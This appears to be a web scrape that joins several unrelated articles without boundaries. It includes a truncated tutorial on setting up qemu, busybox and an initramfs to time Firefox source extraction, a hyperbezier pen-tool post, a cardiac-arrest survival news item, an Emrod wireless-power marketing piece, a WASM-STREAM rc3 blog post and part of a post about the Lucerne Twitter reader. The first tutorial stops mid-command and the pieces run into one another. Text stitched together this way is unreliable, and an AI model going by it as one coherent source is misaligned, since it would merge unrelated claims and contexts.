<pre><code>cd ~/bisecting
wget https://archive.mozilla.org/pub/firefox/releases/84.0.1/source/firefox-84.0.1.source.tar.xz
xz -l firefox-84.0.1.source.tar.xz
</code></pre><p>This returns:</p>
<pre><code>Strms  Blocks   Compressed Uncompressed  Ratio  Check   Filename
    1      12    352.8 MiB  2,203.4 MiB  0.160  CRC64   firefox-84.0.1.source.tar.xz
</code></pre><p>So we should assume at least 2.2GB of storage needed once extracted.  We’ll want to give it plenty of headroom to avoid any behavioural changes that may be triggered when the drive is nearly full.  So let’s take 10G as a reasonable starting point.   Most file systems support “sparse” files, so we won’t actually take up 10G of space, only whatever is used.  We can use <code>truncate</code> to create a sparse 10G file, and then <code>mkfs.btrfs</code> to format it</p>
<pre><code>truncate -s 10G btrfs
mkfs.btrfs btrfs
</code></pre><p>Okay, that’s the easiest bit done.  Now on to initramfs creation.</p>

<p>An initramfs is a CPIO archive, typically gzip’d, containing a simple filesystem.  We can create something suitable pretty much anywhere we like, and just package it up.</p>
<p>Let’s create the skeleton of one first:</p>
<pre><code>mkdir -p ~/bisecting/initramfs/{bin,sbin,etc,proc,sys}
</code></pre><p>At the very least we’re going to need <code>tar</code> and <code>time</code> while we experiment creating a reproduceable test, and ideally the <code>timeout</code> command for when we automate it.  The easiest way to achieve this is via busybox (<a href="https://www.busybox.net/)">https://www.busybox.net/)</a>.  We’ll need a statically compiled (entirely self contained) version of busybox for this.  On Debian derivatives, you can install the <code>busybox-static</code> package via <code>apt</code>.  Alternatively you could download the binary from Busybox direct: <a href="https://www.busybox.net/downloads/binaries/">https://www.busybox.net/downloads/binaries/</a>.  Verify that it is statically compiled by running <code>ldd</code> against the busybox binary.  It should report “not a dynamic executable”.  We’ll need a copy installed in the initramfs:</p>
<pre><code>cd ~/bisecting/initramfs/bin
cp /path/to/busybox ./
./busybox --install .
ls
</code></pre><p>You should see from the ls output that busybox is providing a number of standard linux tools.</p>
<p>Now we’ll need a <code>init</code> script to go along with it.  We’re going to aim for fairly minimal as we’re exploring this. What we’ll ideally want is the firefox sources, and a shell prompt.</p>
<pre><code>cd ~/bisecting/initramfs
cp ../firefox-84.0.1.source.tar.xz ./
cat &gt; init &lt;&lt; EOF
#!/bin/sh

# mount special mount points
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -n -t tmpfs none /dev
mdev -s

# Give us a shell
sh

# Power off the machine when done
poweroff -f
EOF

chmod +x init
</code></pre><p>That gives us everything we should need, we just need to convert it in to the initramfs.</p>
<pre><code>find . | cpio -H newc -o | gzip &gt; ../initramfs.gz
</code></pre><p>We now have:</p>
<ul>
<li>a kernel</li>
<li>an initramfs</li>
<li>a BTRFS formatted file ready to be used as a file system</li>
</ul>
<p>Let’s explore what we get, see if we can time extraction of the sources.</p>
<h2 id="exploring">Exploring</h2>
<pre><code>cd ~/bisecting/linux
sudo qemu-system-x86_64 -enable-kvm -nographic -append console=ttyS0 -kernel arch/x86/boot/bzImage -m 4G -drive format=raw,file=../btrfs -initrd ../initramfs.gz
</code></pre><p>Okay, now we have a prompt.  All being well, we also have a <code>/dev/sda</code></p>
<pre><code>/ # dmesg | grep sda

        <h2 id="introduction">Introduction</h2>

<p>This post introduces a new model for a path drawing (pen) tool, with a particular focus on font design.</p>

<p>Although this tool works much like familiar pen tools (which are based on the manipulation of <a href="https://en.wikipedia.org/wiki/B%C3%A9zier_curve">Bézier curves</a>), it is actually based on a new family of two-control-point curves, which we’ve been calling the <em>hyperbezier</em>.</p>

<p>This work is still in its early stages, and the demo below is quite barebones; my goal here is to get a simple version of this tool into the hands of designers and design-tool makers, so that more people can start to play around and evaluate it.</p>

<h4 id="contents">Contents</h4>



<h3 id="-background--motivation"><a id="background"></a> Background &amp; motivation</h3>

<p>The basis of this tool is a new mathematical model for fitting a curve to a set of points; that work was done earlier in the year by my collaborator <a href="https://raphlinus.github.io/">Raph Levien</a>. For the past year or so Raph has been excitedly talking to me about about things like <em>splines</em> and <em>G2 continuity</em> and the elegance of the <em>Euler spiral</em>, and I have for the most part been smiling politely and nodding. In the last few weeks however I have started trying to implement a simple drawing app around his new model, and the excitement is catching: this new tool feels like the first I have used that is a compelling alternative to traditional Bézier-curve based drawing tools.</p>

<p>It is likely that if you have ever used a computer drawing application then you have, at some point, used a <em>pen tool</em>: a tool that allows you to place a small number of points, which are then connected with a series of curves, the exact curvature being a function of the position of the points.</p>

<p>Tools like this— which take some fixed number of points and calculate a curve based on them— are called <em>splines</em>. If you are curious about the topic (particularly in the context of interactive design tools), a very accessible overview is Raph’s <a href="https://levien.com/phd/thesis.pdf">dissertation</a>; I won’t go into too much detail here, except to say that Raph has been revisiting this subject recently, and the result is the <a href="https://github.com/linebender/spline"><em>hyperbezier spline</em></a>. Like traditional (cubic) Bézier paths, a hyperbezier path is comprised of segments, each defined by two <em>on-curve</em> and two <em>off-curve</em> (or <em>control</em>) points; the curve passes through the two on-curve points, and the curvature itself is determined by the position of the two off-curve points.</p>

<p><img id="simple-cubic" src="https://www.cmyr.net/assets/hyperbez/hyperbez-simple-cubic1.png" alt="A simple cubic Bézier"></p>
<p>A Bézier path, consisting of two segments</p>

<p>If you’re generally curious about Béziers, <a href="https://pomax.github.io/bezierinfo/">A Primer on Béziers Curves</a> is an excellent resource. For our purposes it is enough to note that splines based on direct manipulation of Bézier control points (most pen tools) provide a high degree of control, but are difficult to use well. In particular, it can be tricky to maintain consistent curvature between adjoining segments of a path, which can lead to a ‘lumpy’ look; the following example is  contrived, but in practice consistently getting smooth feeling curves with Béziers is challenging.</p>


<p>A lumpy path. Mouseover to see the filled outline.</p>

<h3 id="-the-hyperbezier"><a id="hyperbezier"></a> The hyperbezier</h3>

<p>The core idea of the hyperbezier is the use of <em>auto-points</em>. These control points are adjusted automatically by the tool in order to maintain a smooth curve between neighbouring curve segments.</p>

<p>Let’s look at an example. With the path below you can drag points around, and double-click points to toggle their type.</p>

<p>The two green squares are <em>corner</em> points; curve segments that join at these points are allowed to change direction sharply. The two blue circles are <em>smooth</em> points; changing the curve on one side of the point can cause changes in the <em>auto</em> points (and hence the curve) on the other side.</p>

<p>The auto-points are indicated with dashed lines and terminating ‘x’s. The manual control points are indicated with solid lines, and terminating ‘o’s.</p>




<h5 id="playing-around">Playing around</h5>
<p>To get a better understanding of the spline’s behaviour, here are some things to try <em>(this requires a mouse)</em>:</p>
<ul>
  <li><em>double-click the bottom point to make it smooth</em>. When this point is smooth, the auto points beside it are adjusted so that the two curve segments join smoothly.</li>
  <li><a href="#" onclick="reloadHeart();return false;">reset,</a> or double-click the bottom point to turn it back into a corner. Now <em>doubleclick the top-left smooth point</em>. Making the top-left point a corner will replace the curve between them with a straight line. Two adjacent corners with only auto-points between them will always form a straight line, because a line is maximally smooth.
    <ul>
      <li>You should notice two small ‘x’s on this line. <em>Drag one of these auto points somewhere to position it manually</em>. You will notice that the remaining auto-point is repositioned as you drag.</li>
      <li><em>Drag the other auto-point</em>. With both control points positioned manually, and with corners at either end, you have full control of this segment.</li>
    </ul>
  </li>
</ul>

<!--(TK: SIMPLIFY ME, JUST INTRODUCE AUTO POINTS)The principal goal of the hyperbezier is to make it easier to maintain consistent curvature between adjoining segments of a path. This is achieved by letting the designer choose to have certain control points positioned automatically. These *auto-points* are adjusted in response to changes in adjoining segments so as to form a [smooth][smoothness] curve.-->

<!--In addition, on-curve points can be either *smooth* points or *corners*; if a point is smooth (marked by a green circle) then any auto points on either side of that point will be adjusted to maintain curvature with the segment on the other side. If a point is a corner (marked by a blue square) then the segment on one side of the point is not influenced by the curvature on the other side.-->

<!--Moving any on-curve point can cause subtle changes to the position of multiple auto-points; the example below is interactive, and you can drag the various points around, or toggle their type. Notice how the behaviour of the auto points changes if you toggle a nearby on-curve point between smooth and corner;

<p>Some example paths, drawn in the tool.</p>

<!--. This is very much a demo; the idea is to explore the interaction model, and to get a sense for how it feels to draw with the tool, compared to the standard Bézier curves used in most pen tools. Spoiler: I think it feels *really good*. You [can play around with it yourself][hypertoy]; it is pretty rough around the edges, but it works.-->

<h4 id="-using-the-toy-pen-tool"><a id="toy-guide"></a> Using the toy pen tool</h4>

<p>The toy is very rough: you have a select and a pen tool, but there are no rulers or measurement tools, no transforms, no ability to select multiple points. The pen works much like the familiar Bézier pen:</p>

<p>General:</p>

<ul>
  <li><code>V</code> key sets selection (arrow) tool, <code>P</code> key sets pen tool</li>
  <li>holding the space bar hides UI and shows filled path</li>
  <li>the current drawing is stored as part of the URL; copy this somewhere to “save”</li>
</ul>

<p>Pen tool:</p>

<ul>
  <li>click to add a line segment ending in a corner point</li>
  <li>alt + click to add an automatic curve segment ending in a smooth point</li>
  <li>click + drag to add a curve segment ending in a smooth point, with a manual control point</li>
  <li>click on a line segment to insert a point there; alt makes it a smooth point</li>
  <li>alt + click on any existing point to toggle the type of that point</li>
</ul>

<p>Select tool:</p>

<ul>
  <li>drag a control auto-point to move it, converting it to a manual point if necessary</li>
  <li>double-click will toggle an on-curve point between smooth and corner</li>
  <li>alt + click on a line segment to add two auto points</li>
  <li>deleting an off-curve point makes that curve segment into a line segment</li>
  <li>arrow keys nudge the current selection by 1 px; adding shift makes it 10px, and ctrl/cmd makes it 100px.</li>
  <li>shift + any of the above moves all of the points in the current outline (I’m sorry)</li>
</ul>

<h3 id="-next-steps"><a id="next-steps"></a> Next steps</h3>

<p>The code for the spline, including the demo, is <a href="https://github.com/linebender/spline">open source and available on github</a>.</p>

<p>The intent of this demo is twofold: firstly to test out how the curve feels to use, and to start playing around with the UX of the pen tool, and secondly to share this research with the broader community of designers and design-tool creators. Although this work is quite rough, my personal feeling is that this spline shows tremendous promise. Anecdotally, as a mere casual user of design tools, I find it <em>significantly</em> easier to make good looking curves with the hyperbezier than I do with traditional Bézier pen tools.</p>

<p>Perhaps the biggest question will be figuring out the best interaction model: what set of mouse clicks, key presses and modifiers the user issues in order to control the state of the points. This has been a challenge for other new splines; the interaction model we use with Béziers is <a href="https://youtu.be/sT8Y7o-zsVw?t=68">familiar and long-established</a>, and people (especially graphic designers) are deeply comfortable with it. The interaction model used here for the hyperbezier is intentionally designed to feel similar to these existing tools, but other interaction models may be worth exploring.</p>

<p>In the coming weeks I hope to integrating the spline into <a href="https://github.com/linebender/runebender">Runebender</a>, a font editor, which will provide a much richer editing experience and will let us better explore how well the spline is suited to real-world use. In addition, Raph intends to do a more detailed writeup of the spline itself and the associated math, which derives both from the earlier Spiro spline and the classic model of elastica under tension.</p>

<p>If you’re curious about the spline, there are more details in the <a href="https://github.com/linebender/spline">github repo</a>; if you have questions you can open an issue there, ask them in our <a href="https://xi.zulipchat.com/">zulip chat server</a> or reach out on <a href="https://twitter.com/cmyr">on twitter</a>.</p>

						<p>In patients with low socioeconomic status, heart resuscitation is heavily delayed and, according to a recent European Heart Journal report last week, victims of cardiac arrest in hospitals are less likely to recover.</p><p>Researchers analyzed data from the national Swedish cardiopulmonary resuscitation register for 24,217 cardiac arrests in Swedish hospitals between 2005 and 2018 in patients 40 and older. They collected socioeconomic data on patients from a second database and used the highest rate of education and annual income as a socioeconomic status (SES) measure.</p><p>"The good news is that for most of the cardiac arrest cases in this study, socioeconomic status didn't seem to matter." said Professor Jens Agerström of Linnaeus University in Kalmar and Växjö, Sweden, "Nevertheless, there seems to be a significant number of deaths that can still be attributed to socioeconomic factors, even when we take account of things that could affect the results such as gender, age, ethnicity, other health conditions, cause of the cardiac arrest, and the specific hospital providing the treatment."</p><p>Patients with higher SES were slightly better controlled for heart rhythm prior to cardiac arrest. This may partly explain the survival disparities. Most unrecovered combinations between patient SES and the findings studied are minimal. A disparity in SES-related survival chances of around 21 percent shouldn't be overlooked, authors say.</p><figure><img src="https://smosa.com/content/images/2020/12/ehaa954f3.png" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/ehaa954f3.png 600w, https://smosa.com/content/images/size/w1000/2020/12/ehaa954f3.png 1000w, https://smosa.com/content/images/size/w1600/2020/12/ehaa954f3.png 1600w, https://smosa.com/content/images/2020/12/ehaa954f3.png 1949w" sizes="(min-width: 720px) 720px"><figcaption>Credit: European Heart Journal</figcaption></figure><p>The study investigated several outcomes but looking at survival for 30 days after the cardiac arrest, approximately 280 people in 1000 from a low socioeconomic background will survive; however, for patients from a high socioeconomic background approximately 320 people may survive to 30 days.</p><p>The goal of the new retrospective registry was to investigate SES inequalities in IHCA care and survival.

<p>Long-range wireless power transmission is a concept that has been a long time coming since Nikola Tesla obtained a patent for the Tesla coil over 120 years ago.&nbsp;&nbsp;</p>



<p>In the recent decade, wireless power has become more of a familiar term, with companies such as Powerbyproxi and WiTricity leading the way with innovation in short-range wireless technology. That is, the ability to transmit electrical power over short distances (up to a few metres), primarily to charge consumer devices like mobile phones. This technology enables us to charge devices without requiring wires within short range, e.g. at home or by driving up to an electric vehicle charging station.</p>



<p>The next evolution in freeing humanity from the restrictions of where wires can go is the ability to transmit large amounts of power over large distances. Instead of charging devices, long-range wireless transmission<strong> </strong>technology<strong> </strong>will allow us to power households, communities and send large quantities of power to places where it is too hard and expensive to reach using wire infrastructure. This is the technology Emrod is working on, which will support the uptake of sustainable energy and decentralizing electric grids.&nbsp;</p>



<p>In this article, we make a comparison between short-range and long-range power transmission, including the difference in technology and use cases.</p>



<p>First, let’s start with getting clear on what wireless power transmission is.</p>



<h3><strong>What is wireless power transmission?</strong></h3>



<p>Wireless power transmission is the act of delivering meaningful amounts of energy without moving or employing mass between transmitter and receiver. Electromagnetic fields convey power across space. It can replace the need for wires and batteries to provide a more convenient, mobile and safer way to provide energy.&nbsp;</p>



<p><em>According to early history, Heinrich Hertz was the first to prove the existence of electromagnetic waves. Hence the name “hertz” as the unit for frequency.</em></p>



<p>The difference between short and long-range power transmission can clearly be defined by the distance across which the power is transmitted. However, what determines the capabilities of these different types of technology?</p>

<h3><strong>Short-range wireless power</strong></h3>



<p>Short-range is typically power transmission within centimetres and metres. The most common wireless power transmission technique is with Inductive Power Transfer, where power is transferred utilizing a magnetic field using inductive coupling between two coils of wire.&nbsp;</p>



<p>Examples of short-range power transmission by this definition include powering devices wirelessly within a house or building and charging electric cars using a resonant magnetic induction pad on the ground.</p>



<h3><strong>Long-range wireless power transmission</strong></h3>



<p>Long-range is typically power transmission of 100’s of metres or across kilometres. One technique of power transmission is using antennas to send electromagnetic beams, like microwaves or lasers. The limitation with using inductive coupling power transmission in long-range is that the magnetic field decays quite rapidly when the distance between the transmitter and receiver is increased. Therefore, electromagnetic beaming is more appropriate for this reason.&nbsp;</p>



<p>Long-range power transmission with antennas can be categorised into Near-Field or Far-Field. In the near-field, one can observe plane waves with very little to no beam divergence. Conversely, in the far-field there is significant beam divergence, and inverse squared decay for the power density with distance, something which is not observed in the near-field.&nbsp;</p>



<p>For Emrod’s purpose, we work in the near-field to produce a collimated beam with negligible loss.&nbsp;</p>



<p><br>The use cases for long-range transmission include beaming power from space to earth, charging unmanned aerial vehicles (without requiring the UAV to return to a base for charging) and transmitting power across difficult terrain instead of using wires, which is the problem we are solving at Emrod. Learn more about the use cases for Emrod’s technology <a href="https://emrod.energy/use-cases/">here.</a></p>



<h3><strong>Why are these new developments in long-range technology significant?</strong></h3>

<p>For energy to be useful, it needs to move from where it is generated to where it is required. Energy is similar to communication in this sense. For communication services to be useful, they must be able to transmit a message from one person to another. At the moment, our methods for generating energy are dependent on the locations that can be accessed economically using wired infrastructure (lines and pylons, and underwater cables). Many of the best places to generate renewable energy are hard to reach areas, for example high up on hills or mountains or offshore locations, where there is lots of wind, and it’s well out of the way of people.&nbsp;</p>



<p>On the other hand, the people who have access to energy are dependent on the economics of connecting the household or community to a power source. Many communities and dwellings do not have reliable access to electricity because they are in remote, hard to access areas where it is not economically viable to put in and maintain power lines or cables.&nbsp;</p>



<p>By reducing the costs and ease of installing and maintaining the infrastructure that transmits power from one place to another, we can open up our access to and provision of energy.</p>



<h3><strong>Emrod’s long-range wireless technology use cases</strong></h3>



<p>At Emrod, we have developed technology that allows power to be transmitted over many kilometres.&nbsp; It is the worlds first long-range wireless power transmission technology that is commercially viable. We use passive relays to achieve power transmission over a long distance, without the losses that would otherwise make long distance transmissions inefficient and uneconomical for commercial purposes.&nbsp;</p>



<p>The application of Emrod’s technology is wide-reaching, but we are primarily focused on working with energy distribution companies and organizations driving sustainable energy and decentralized grid projects.&nbsp;</p>



<p>Emrod’s wireless system can provide a cost-effective solution for the transmission of power across terrain where it is difficult to lay and maintain power lines and cables. For example across forests or waterways, to alleviate right of passage issues or reduce the ecological impact of pylons, and to provide back up systems when power lines fail, for example, outages or disaster relief.&nbsp;</p>



<p>You can read more about the common use cases for Emrod’s technology on the <a href="https://emrod.energy/use-cases/">Use Cases page of our website</a>.</p>



<h3><strong>Conclusion</strong></h3>



<p>The early modern development of wireless transmission technology used magnetic induction charging pads, which required contact and careful alignment of the device, e.g. a phone. Subsequently, technology developed to charge smartphones and other devices from meters away that works like a strong WiFi. This technology has been considered long-range, in comparison to the previous wireless technology, which required the transmitting and receiving devices to be in contact with one another. We have now entered into the next era of wireless technology, which is the transmission of larger amounts of power over kilometres. It is an exciting next step towards Nikola Tesla’s vision of power everywhere.</p>

<hr>
<p>It's that time between Christmas and new year again, where you can usually find me at Leipzig's Congress Zentrum on my computer hacking away. It's chaos congress time. Given this year's pandemic, the "37c3" however, was moved to the internet and renamed to <a target="_blank" rel="noopener" href="https://rc3.world/">"rc3", the Remote Chaos Communication Congress</a>.</p>
<p>Earlier this month, the iconic congress build-up started. This time around, building up didn't involve moving heavy crates of mate tea around. Instead, it meant that everyone started designing, drawing, and building their assembly maps for the "rc3.world". A <a target="_blank" rel="noopener" href="https://events.ccc.de/2020/09/04/rc3-remote-chaos-experience/">2D virtual space</a> that's supposed to replace this year's lack of physical space.</p>
<p>The rc3.world software is a fork of <a target="_blank" rel="noopener" href="https://workadventu.re/">workadventu.re</a>, a 2D game simulating a virtual work environment with avatars. Within this 2D map of the virtual congress, the organizers invited all assemblies to build their own spaces. And so, as the build-up for <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a> assembly began, I had an idea for a project.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-synth-screenshot.png" alt=""><figcaption><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, the project I launched at last year's c3</figcaption>
</figure>
<p>At last year's congress in Leipzig, I had launched <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, a synthesizer built in WebAssembly. Naturally, this time I was eager to take the project to the next stage. Hence, roughly a week ago, I started to work on a new project called "WASM-STREAM" - an extension to wasm-synth.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/social-dist0rtion-protocol/wasm-stream">WASM-STREAM</a> is a virtual stage for digital artists. Using WASM-STREAM, an artist can broadcast their play with wasm-synth to an internet radio stream. More importantly, though, this means that they can take the stage on the <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a>'s assembly and jam away to a virtually present audience.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-stream.png" alt=""><figcaption>Social Dist0rtion Protocol's dance floor in the rc3.world</figcaption>
</figure>
<p>So how did I build it?</p>
<h2 id="a-first-little-demo">A First Little Demo</h2>
<p><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a> is a project that I built deliberately to showcase the power of the web. At the beginning of the year, I wrote <a href="https://timdaub.github.io/2020/02/19/wasm-synth/">a blog post</a> outlining its technical details. It's using the <code>AudioWorklet</code> and some WebAssembly-transpiled code to render audio in real-time in the user's browser.</p>
<p>Now, workadventure, the software ccc uses to run their rc3.world, is also built on the web and allows embedding audio streams. So I thought, why not take the audio generated in wasm-synth and stream it to everyone in the rc3 world.</p>
<p>In a way, it sounds like not that big of a deal to build an audio streaming client within a website. But remember that a browser's networking ability is limited. While we've come a long way from the <code>XMLRequest</code> API to <code>fetch</code>, <code>WebSocket</code> and <code>WebRTC</code>, these concepts only allow talking upstream if their authors deliberately built their upstream application for supporting them.</p>
<p>Naive as I Am, I started by deploying <a target="_blank" rel="noopener" href="https://icecast.org/">icecast2</a> to a small Hetzner instance. I configured an authorized mount point that allows a streamer to connect using client software. Then I looked for a way to stream audio directly to icecast from a browser. And found... nothing.</p>
<p>Well, I did find something. It's called <a target="_blank" rel="noopener" href="https://webcast.github.io/">webcast</a>, and it's a <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">WebSocket-based subprotocol</a> that allows sending binary audio data between a client and a server. In their <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js#server">README.md</a>, the authors also mention webcast's compatibility with <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/">liquidsoap</a>, a DSL for audio stream processing.</p>
<p>So my first attempt at plugging these things together involved encoding the <code>Float32Array</code> data from the <code>AudioWorklet</code> into an mp3 stream using <a target="_blank" rel="noopener" href="https://github.com/toots/shine/">libshine</a> (that has a wasm JavaScript package) and then sending it to a <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/doc-dev/harbor.html">liquidsoap "harbor"</a> via webcast. Liqidsoap would then convert the mp3 stream to ogg-vorbis, make it stereo, and forward it to the icecast server.</p>
<p>And, to my surprise, it worked. When I hit some keys on the wasm-synth, they got encoded and sent to the audio stream. With a bit of delay, I heard what I had just played. Cool!</p>
<p>Anyways, with my small little demo, I was galvanized and motivated enough to spend more time building something that would work for the congress.</p>
<h2 id="the-wasm-stream-architecture">The WASM-STREAM Architecture</h2>
<p>Ultimately, liquidsoap was not well-suited for my purpose. I also quickly realized that all I had to do was build a proxy between the <a target="_blank" rel="noopener" href="https://gist.github.com/ePirat/adc3b8ba00d85b7e3870">icecast protocol</a> and the <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">webcast protocol</a>. And that's what I ended up building. A small <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">JavaScript application</a> implementing two protocols. It listens for incoming WebSocket connections and calls icecast with a loooooonng PUT request to establish a stream.</p>
<p>WASM-STREAM itself doesn't do any encoding. It can, however, route an <code>audio/ogg</code> or an <code>audio/mpeg</code> stream from webcast to icecast. The encoding from WAV to mp3 takes place on the user's device already when the play the synthesizer.</p>
<h2 id="how-to-use-wasm-stream">How To Use WASM-STREAM</h2>
<p>Whether you have a ticket to rc3 or not, you can tune into the stream at <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/stream">https://audio.daubenschuetz.de/stream</a>. It's an mp3-encoded stream, meaning it won't work in all browsers equally (Firefox works natively; Chrome et al. only support ogg/vorbis natively). If it doesn't, try a desktop application like iTunes or VLC.</p>
<p>The stream is continuously online. But if you don't hear anything then that's because nobody is currently playing the <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">WASM-SYNTH</a>.</p>
<p>Finally, you're able to "dance" on the Social Dist0rtion Protocol's assembly dance floor. The rc3 orga was nice enough to allow us streaming audio on our map. <a target="_blank" rel="noopener" href="https://rc3.world/rc3/room/93840a8f-88f7-4f11-bb61-68800c4d4962/">Click here</a> to visit us directly on the rc3.world map.</p>

December 27, 2020 | https://thesephist.com/posts/lucerne/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/lucerne/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>Over the last week, I’ve been working on <a href="https://github.com/thesephist/lucerne">Lucerne</a>, a Twitter “reader” app built to fit my personal needs from Twitter. It’s been an interesting exercise in <a href="https://thesephist.com/posts/tools/">building a tool around workflows</a>, so I wanted to tell you the story of how the design came to be, and what I’ve noticed using Lucerne for my daily escapades into the Twittersphere.</p>
<p><img src="https://thesephist.com/img/lucerne.png" alt="Lucerne in action"></p>
<p>Like many of my personal tools, Lucerne is built with my <a href="https://dotink.co/">Ink programming language</a> on the backend and my <a href="https://github.com/thesephist/torus">Torus</a> UI library on the frontend. It’s made just for me at the moment, but given the interest I’ve gotten about Lucerne online, I might make a version open for anyone to use.</p>
<h2 id="designing-myself-a-better-twitter">Designing myself a better Twitter</h2>
<p>For me, Twitter serves two purposes. First, it’s a <em>learning tool</em>. There are lots of smart folks talking to each other and sharing what they’re thinking about on Twitter from software to economics to writing, and I can find on Twitter opinions or perspectives I can’t find on blogs or books. Second, it’s a <em>place for me to share whatever I’m working on</em> on my blog or on my side projects with my audience. Lucerne is designed around these two primary workflows: learning and sharing.</p>
<p>Twitter’s main user interface, the algorithmic timeline, is bad for using Twitter as a learning tool. It feels like sticking a straw into a firehouse and hoping you’ll suck out enough interesting insights to be worth the effort. I wanted a better way for me to discover and keep track of interesting conversations happening on Twitter about any topic. Twitter does provide decent tools for me to share my work online – things like scheduled tweets, analytics, notifications, and search – but they’re not in one place, so I wanted to consolidate these tools.</p>
<p><img src="https://thesephist.com/img/lucerne-timeline.jpg" alt="A timeline view in Lucerne"></p>
<p>With these two goals in mind, I also wanted Lucerne to be a tool that could <a href="https://thesephist.com/posts/ivy/">grow with me as I used it</a>, so I could mold my experience of Twitter around what I found to be most useful to me over time. More than other tools, Twitter feels organic and constantly changing. I didn’t want to have to bake in all the tools and dials I might ever want to use from the get-go. Instead, I wanted to be able to stumble into interesting use cases as I used Lucerne over time.</p>
<p><img src="https://thesephist.com/img/lucerne-querybar.jpg" alt="Performing a search in Lucerne"></p>
<p>To make it possible to grow Lucerne as a tool gradually around my use cases like this, Lucerne is designed primarily around one important idea: <strong>filtered searches saved as “channels”</strong>. Feeding from the firehose of conversations on Twitter, a “channel” is a small filtered stream of tweets defined by a particular search query. Here are some examples of useful filters.</p>
<ul>
<li>“tweets between A and B about #topic” – <code>(from:A OR from:B) #topic</code></li>
<li>“tweets about abc.com with more than 100 likes” – <code>url:abc.com min_faves:100</code></li>
<li>“tweets by A that include images, but exclude retweets” – <code>from:A filter:images -filter:retweets</code></li>
</ul>
<p>With Lucerne, I can search for interesting conversations happening on Twitter by experimenting with these filters. When any filter seems particular useful, I can save it to check again later, by adding it to the left sidebar with a name. As I use the app, I end up curating an ever-changing personalized collection of these channels in my sidebar that provide multiple different views onto the firehose of Twitter.</p>
<p>“But Linus,” I hear you saying, “you can search and save them as timelines on Twitter’s app and Tweetdeck.” Yes, you’re right, and most of the search filters Lucerne uses are also available on Twitter. But the important thing about Lucerne isn’t just that you can search, but that <strong>playing with filters and saving the good ones is the primary user interface</strong>. On Twitter, you might search once or twice to find something useful, but you’re <em>mostly</em> interacting with a single timeline passively. With Lucerne, most of my use is exploring and adding to a curated list of filters, and exploration and consumption are one and the same activity. As I’ll explain later from my personal experience, this makes a big difference in how much I can get out of Twitter.</p>
<p>I think the most important design lessons in Lucerne is what I <em>didn’t</em> do: I could have made a list of features that I might have wanted in the beginning, and baked it all into the app. Features like “follow specific threads”, “see top tweets from a particular user”, “follow hashtags”, or “hide retweets from the timeline.” But instead of adding a million settings and toggles, I found what I would consider to be the “atoms”, the common building blocks, of all of these use cases, and baked it into the core of the app instead. All these use cases above can be performed just as easily as filtered searches, and because these filters can be saved and referenced later, Lucerne can grow around my exact use cases <em>as I continue using it</em>. I don’t have to design for all my use cases from the start. This is what I mean when I say <a href="https://thesephist.com/posts/ivy/">we need to design tools to grow with us</a>.</p>
<p>In addition to this main idea of channels, Lucerne has a few other design considerations to improve how Twitter works for me. All the engagement stats I care about are present in a single screen, so I don’t have to annoyingly load five different pages every time, but they’re out of the way of the main “timeline” view, because I don’t want them in my face all the time. There’s a small pane on the right showing me my most recent new followers, which is sometimes useful when I see someone particularly interesting and want to reach back out to them. This also saves me a few clicks every time. Lastly, I intentionally didn’t implement <em>infinite scrolling</em>, in lieu of a simple “load more” button. This makes endlessly scrolling a conscious enough action for me that I end up wasting less time scrolling through my timeline. It goes without saying, all of these experiences are also much better because I don’t serve myself ads in between my tweets. My timeline feels cleaner.</p>
<h2 id="how-im-using-lucerne">How I’m using Lucerne</h2>
<p>I reached an “MVP” stage with Lucerne a few days ago, and since then, I’ve used Lucerne more and Twitter’s website less for browsing through Twitter. Lucerne isn’t meant to be a Twitter <em>replacement</em>. Twitter’s web app is still great for writing and following threads, for example, and I don’t want to have to re-create something that’s already fine for my use. But for my two main workflows of <em>learning</em> and <em>tracking my progress</em> on Twitter, Lucerne works better for me.</p>
<p>The biggest change I’ve noticed from using the client is that it turns Twitter from a consumption experience into an exploratory experience. Instead of drinking from a firehose through a straw, the firehose feeds into an evolving castle of infinite fountains, and my job is to look around the castle for the fountains of information that seem more interesting or insightful. For the first time in a long time, I feel like I’m pulling from the firehose of Twitter instead of constantly poking straws into the stream to see what I luck out with.</p>
<p>The real fun of using Lucerne to explore Twitter isn’t just reading tweets in a timeline, but poking around in the <a href="https://en.wikipedia.org/wiki/The_Library_of_Babel">infinite library</a> that Twitter sometimes feels like, collecting the interesting streams of information into my pocket.</p>
<p>Here are a few use cases I stumbled into while using Lucerne that I otherwise couldn’t have.</p>
<p><strong>Following interesting threads.</strong> I often stumble into interesting threads of tweets that I want to track somehow. While using Lucerne, I ran into one tweet about <a href="https://twitter.com/geoffreylitt">@geoffreylitt</a> building a Twitter browser extension called Twemex, and another thread by <a href="https://twitter.com/TZhongg">@TZhongg</a> asking for book recommendations. Normally, I would probably just bookmark it and never check it again, but with Lucerne, I just saved filters for “replies to this tweet” as channels in my sidebar, and I’ve checked them regularly since to find interesting project updates and book recommendations.</p>
<p><strong>Following an account’s tweets on a topic.</strong> <a href="https://twitter.com/Noahpinion">@Noahpinion</a> is one of those accounts that have a lot of interesting ideas to share covering a huge range of topics. Sometimes about foreign policy, sometimes about fiscal policy and economics, sometimes about China. I wanted to be able to follow “just tweets about this account on Japan”, for example, and I could do this trivially by setting up a channel <code>from:Noahpinion Japan</code>.</p>
